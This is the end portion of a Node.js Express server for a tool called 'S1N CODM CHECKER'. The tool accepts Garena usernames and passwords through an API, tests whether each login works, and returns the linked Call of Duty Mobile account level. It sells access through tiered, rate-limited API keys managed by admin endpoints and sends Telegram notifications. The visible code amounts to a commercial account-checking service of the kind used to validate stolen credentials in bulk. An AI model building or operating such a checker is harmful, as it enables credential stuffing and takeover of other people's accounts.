            const displayLevel = (result.codm_details && result.codm_details.level !== null) ? result.codm_details.level : "N/A";
            logging.info(`/api/check: Success for Garena user ${safeUser}. CODM Level: ${displayLevel}`);
            delete result.password; // IMPORTANT: Remove password from response
            return res.status(200).json({ status: "success", data: result });
        } else if (Array.isArray(result) && result[0] === "CODM_FAILURE") { // Partial success (Garena OK, CODM fail)
            const [, fail_user, , fail_reason_raw] = result;
            const fail_reason = strip_ansi_codes(String(fail_reason_raw));
            logging.warning(`/api/check: CODM_FAILURE for Garena user ${String(fail_user || "").substring(0,3)}... Reason: ${fail_reason}`);
            return res.status(200).json({ // Still 200, but with error details for CODM part
                status: "partial_success",
                message: "Garena login successful, but CODM check failed or account not linked.",
                details: fail_reason,
                error_type: "CODM_FAILURE",
                username: fail_user // Redundant if client sent it, but good for clarity
            });
        } else if (typeof result === 'string') { // Full failure, result is an error string
            const error_message = strip_ansi_codes(result);
            logging.warning(`/api/check: Failed for Garena user ${safeUser}. Reason: ${error_message}`);
            
            let statusCode = 400; // Default for general errors from checker
            if (error_message.startsWith("[🤖] CAPTCHA")) statusCode = 429; // Too Many Requests (rate-limit like)
            else if (error_message.includes("INCORRECT PASSWORD")) statusCode = 401; // Unauthorized
            else if (error_message.startsWith("[👻] ACCOUNT DOESN'T EXIST")) statusCode = 404; // Not Found
            else if (error_message.includes("FORBIDDEN (403)")) statusCode = 403; // Forbidden
            else if (error_message.startsWith("[⏱️]") || error_message.includes("TIMEOUT")) statusCode = 504; // Gateway Timeout
            else if (error_message.startsWith("[🔴]") || error_message.startsWith("[🔌]")) statusCode = 502; // Bad Gateway (network/connection issues)
            else if (error_message.startsWith("[💥]") || error_message.startsWith("[🧩]") || error_message.startsWith("[⚠️]")) statusCode = 500; // Internal Server Error (or checker logic error)

            return res.status(statusCode).json({ status: "error", message: error_message, error_type: "CHECK_FAILED" });
        } else { // Unexpected result type from checker
            logging.error(`/api/check: Unexpected result type for Garena user ${safeUser}. Result: ${JSON.stringify(result).substring(0,200)}`);
            return res.status(500).json({ status: "error", error: "Internal error: Unexpected result type from checker logic." });
        }
    } catch (error) { // Catch errors from the API handler itself or unhandled from checker
        logging.exception(`Critical error in /api/check for Garena user ${safeUser}:`, error);
        if (error.isSysExit) { // Handle sys.exit throws
            return res.status(500).json({ status: "error", error: "Critical internal process error encountered.", details: error.message, code: err.exitCode });
        }
        // General server error
        res.status(500).json({ status: "error", error: "Internal server error during check execution.", details: strip_ansi_codes(error.message) });
    }
});

// Admin Endpoints for API Key Management (using api_keys_manager.js)
app.post('/admin/keys/add', adminAuthMiddleware, async (req, res) => { // async for consistency if manager becomes async
    const { userId, tierName } = req.body;
    if (!userId || !tierName) return res.status(400).json({ error: "userId and tierName (string) are required in JSON body." });
    if (!apiKeyManager.TIERS || !apiKeyManager.TIERS[tierName]) {
        return res.status(400).json({ error: `Invalid tierName. Valid tiers: ${apiKeyManager.TIERS ? Object.keys(apiKeyManager.TIERS).join(', ') : 'N/A (TIERS not defined)'}` });
    }
    try {
        const result = apiKeyManager.addApiKey(userId, tierName); // Assuming this is synchronous
        logging.info(`Admin: Added API key for user '${userId}', tier '${tierName}'. Key: ${result.apiKey.substring(0,5)}...`);
        // Send back the generated key and its details
        res.status(201).json({ message: "API key added successfully.", apiKey: result.apiKey, details: result.details });
    } catch (e) {
        logging.exception("Admin: Error adding API key:", e);
        res.status(500).json({error: "Failed to add API key.", details: e.message});
    }
});

app.post('/admin/keys/remove', adminAuthMiddleware, async (req, res) => {
    const { apiKey } = req.body;
    if (!apiKey) return res.status(400).json({ error: "apiKey (string) is required in JSON body." });
    try {
        const result = apiKeyManager.removeApiKey(apiKey); // Assuming sync
        if (result.error) return res.status(404).json(result); // { error: true, message: "API key not found." }
        logging.info(`Admin: Removed API key ${apiKey.substring(0,5)}...`);
        res.status(200).json(result); // { success: true, message: "API key removed." }
    } catch (e) {
        logging.exception("Admin: Error removing API key:", e);
        res.status(500).json({error: "Failed to remove API key.", details: e.message});
    }
});

app.get('/admin/keys/info/:apiKey', adminAuthMiddleware, async (req, res) => {
    const { apiKey } = req.params;
    try {
        const result = apiKeyManager.getApiKeyInfo(apiKey); // Assuming sync
        if (result.error) return res.status(404).json(result);
        logging.info(`Admin: Queried info for API key ${apiKey.substring(0,5)}...`);
        res.status(200).json(result.keyData); // Send keyData directly
    } catch (e) {
        logging.exception("Admin: Error getting API key info:", e);
        res.status(500).json({error: "Failed to get API key info.", details: e.message});
    }
});

app.get('/admin/keys/user/:userId', adminAuthMiddleware, async (req, res) => {
    const { userId } = req.params;
    try {
        const result = apiKeyManager.findApiKeysByUserId(userId); // Assuming sync
        if (result.error) return res.status(404).json(result);
        logging.info(`Admin: Queried keys for user ID '${userId}'. Found: ${Array.isArray(result.keys) ? result.keys.length : 0}`);
        res.status(200).json(result.keys); // Send array of keys directly
    } catch (e) {
        logging.exception("Admin: Error finding keys by user ID:", e);
        res.status(500).json({error: "Failed to find keys by user ID.", details: e.message});
    }
});

app.get('/admin/keys/all', adminAuthMiddleware, async (req, res) => {
    try {
        const allKeysData = apiKeyManager.getAllKeys(); // Assuming sync
        // Transform for better readability if needed, or send raw from manager
        const overview = Object.values(allKeysData).map(k => ({
            apiKey: k.apiKey ? `${k.apiKey.substring(0,5)}...${k.apiKey.slice(-3)}` : 'N/A',
            userId: k.userId, tierName: k.tierName, checksMade: k.checksMade,
            checkLimit: k.checkLimit, active: k.active,
            validUntil: k.validUntil, // Already ISO string from manager
            createdAt: k.createdAt,   // Already ISO string
            lastReset: k.lastReset,   // Already ISO string
        }));
        logging.info(`Admin: Queried all keys. Total: ${overview.length}`);
        res.status(200).json({ keys_overview: overview, total_keys: overview.length });
    } catch (e) {
        logging.exception("Admin: Error getting all API keys:", e);
        res.status(500).json({error: "Failed to get all API keys.", details: e.message});
    }
});

// Global error handler for Express
app.use((err, req, res, next) => {
    logging.exception("Unhandled Express error caught by global handler:", err);
    if (err.isSysExit) { // Custom sys.exit error
        return res.status(500).json({ error: "Critical internal process error.", details: err.message, code: err.exitCode });
    }
    // Default error response
    res.status(err.status || 500).json({ 
        error: "Internal Server Error", 
        details: strip_ansi_codes(err.message || "An unknown error occurred.")
    });
});

function displayStartupBanner() {
    const banner = `
${COLORS['CYAN']}
  ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⣀⣀⣀⠔⡪⣵⣮⣽⡿⢿⣿⣿⡿⢐⡠⢀⠀⠀⠀⠀⠀⠀
  ⢁⡠⢒⣼⡿⠿⠓⠉⠀⠀⠀⠙⢏⣔⠉⠈⣷⣷⣆⠀⠀⠀⠀
  ⠀⣰⢿⠋⠀⣴⣦⣦⣄⡀⠀⠀⠀⠙⢶⣿⣿⠟⢹⡷⡀⠀⠀
  ⡞⣴⠃⠀⠀⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠉⠻⡴⠋⣠⢿⡀⠀
  ⢡⣯⡤⡀⠀⠘⠿⣿⣷⣿⠟⠁⠀⠀⠀⠀⠀⠈⠺⢧⡄⣧⠀
  ⡾⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣶⣄⠀⠀⠀⠀⢹⡟⡆
  ⠁⢰⣿⡟⢄⠀⠀⣴⣿⣿⠀⠘⣿⣯⣿⣿⣷⡀⠀⢠⣿⡇⠇
  ⠀⠈⢃⡵⢍⠦⣄⠀⠚⠃⠀⠀⠹⣿⣿⣯⣿⡇⠠⢻⣿⡽⠀
  ⠀⠀⠀⠉⢁⡕⢍⡱⢢⡀⠀⣀⡀⠈⠉⠉⠉⢀⣴⡟⢹⡄⠀
  ⡄⠀⠀⠀⠀⢀⡺⠨⠳⣼⣿⠟⠻⣗⠄⢀⣴⡿⠋⡰⢃⡇⠀
  ⣿⣷⣄⣀⡀⢚⣿⣶⣄⡉⠁⣠⣶⣾⣿⣿⣋⠔⠋⢠⠜⠀⠀
${COLORS['YELLOW']} S1N CODM CHECKER: API VERSION${COLORS['BOLD']}${COLORS['RESET']}
`;
    console.log(banner);
}

async function main_api_start() {
    const log_dir_name = "logs";
    const log_dir = path.resolve(__dirname, log_dir_name);
    fsExtra.ensureDirSync(log_dir);

    const log_file_name = `checker_api_run_${get_current_timestamp()}.log`;
    const log_file_path = path.join(log_dir, log_file_name);
    
    logging.basicConfig({
        level: logging.INFO, // Or logging.DEBUG for more verbosity
        handlers: [new logging.FileHandler(log_file_path, 'utf-8')],
    });
    
    logging.info(`--- API SCRIPT STARTED (PID: ${process.pid}) ---`);
    logging.info(`Node.js: ${process.version}, Platform: ${os.platform()} (${os.release()})`); // Use os directly
    logging.info(`Log Level: ${logging.getLevelName(logging.getLogger().level)}`);
    console.log(`${COLORS['GREY']}Logging to: ${log_file_path}${COLORS['RESET']}`);

    // Create .api_keys.json if it doesn't exist for the manager
    const keysFilePath = path.join(__dirname, '.api_keys.json');
    if (!fs.existsSync(keysFilePath)) {
        fs.writeFileSync(keysFilePath, JSON.stringify({}, null, 2), 'utf-8');
        logging.info(`Created empty API keys file: ${keysFilePath}`);
    }


    app.listen(PORT, '0.0.0.0', () => {
        displayStartupBanner();
        console.log(`${COLORS['GREEN']}S1N CODM CHECKER API listening on PORT ${PORT}${COLORS['RESET']}`);
        console.log(`${COLORS['YELLOW']}API Endpoint: http://localhost:${PORT}/api/check (GET)${COLORS['RESET']}`);
        console.log(`${COLORS['CYAN']}  Required query params: apikey, user, password.`);
        console.log(`${COLORS['YELLOW']}Admin API Endpoints (require 'x-admin-key' header):${COLORS['RESET']}`);
        console.log(`  ${COLORS['BOLD']}POST${COLORS['RESET']}   /admin/keys/add          Body (JSON): { "userId": "string", "tierName": "string" }`);
        console.log(`  ${COLORS['BOLD']}POST${COLORS['RESET']}   /admin/keys/remove       Body (JSON): { "apiKey": "string" }`);
        console.log(`  ${COLORS['BOLD']}GET${COLORS['RESET']}    /admin/keys/info/:apiKey`);
        console.log(`  ${COLORS['BOLD']}GET${COLORS['RESET']}    /admin/keys/user/:userId`);
        console.log(`  ${COLORS['BOLD']}GET${COLORS['RESET']}    /admin/keys/all`);


        if (ADMIN_MASTER_KEY === "sinluna") {
            console.warn(`${COLORS['RED_BG']}WARNING: Default ADMIN_MASTER_KEY used. Set ADMIN_MASTER_KEY env var for security.${COLORS['RESET']}`);
        }
        if (TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" || TELEGRAM_CHAT_ID === "YOUR_TELEGRAM_CHAT_ID") {
            logging.warning("Default/Placeholder Telegram token/chat ID. Telegram notifications might not work as expected.");
        }

        // Test public IP fetching on startup (optional)
        get_public_ip().then(ip => logging.info(`Current public IP on startup: ${ip}`)).catch(() => {});
    });
}

if (require.main === module) { 
    main_api_start().catch(err => {
        const clean_error_msg = strip_ansi_codes(String(err.message || err));
        // Ensure console is available before logging critical startup errors
        const errorMsg = `${COLORS['RED_BG']}${COLORS['WHITE']} 💥 CRITICAL STARTUP ERROR: ${htmlEscape(clean_error_msg)} ${COLORS['RESET']}`;
        console.error(errorMsg);
        if (logging && typeof logging.critical === 'function') { // Check if logging is initialized
            logging.critical("CRITICAL STARTUP ERROR", err);
        }
        process.exit(1);
    });
}

function gracefulShutdown(signal) {
    console.log(`\n${COLORS['RED']}🛑 Received ${signal}. Shutting down gracefully...${COLORS['RESET']}`);
    if (logging && typeof logging.warning === 'function') {
        logging.warning(`Received ${signal}. Shutting down.`);
    }
    // Add any cleanup tasks here (e.g., closing DB connections)
    // Give a small timeout for logging to flush
    setTimeout(() => {
        if (logging && typeof logging.error === 'function') {
             logging.error("Graceful shutdown sequence complete or timed out. Forcing exit.");
        }
        process.exit(0); // Exit with 0 for graceful shutdown
    }, 1500); // Adjust timeout as needed
}

process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

process.on('exit', (code) => {
    if (logging && typeof logging.info === 'function') {
        logging.info(`--- SCRIPT FINISHED (CODE ${code}) ---`);
    }
    console.log(Style.RESET_ALL); // Reset console colors on exit
});

process.on('unhandledRejection', (reason, promise) => {
    const reasonStr = (reason instanceof Error) ? reason.stack : String(reason);
    if (logging && typeof logging.critical === 'function') {
        logging.critical('Unhandled Rejection at:', promise, 'reason:', reasonStr);
    } else {
        console.error('Unhandled Rejection at:', promise, 'reason:', reasonStr);
    }
    // Optionally exit, but usually unhandledRejections are non-fatal by default in newer Node
    // process.exit(1); 
});

process.on('uncaughtException', (error) => {
    const errorStr = error.stack || String(error);
    if (logging && typeof logging.critical === 'function') {
        logging.critical('Uncaught Exception:', errorStr);
    } else {
        console.error('Uncaught Exception:', errorStr);
    }
    // Uncaught exceptions are generally fatal
    process.exit(1); 
});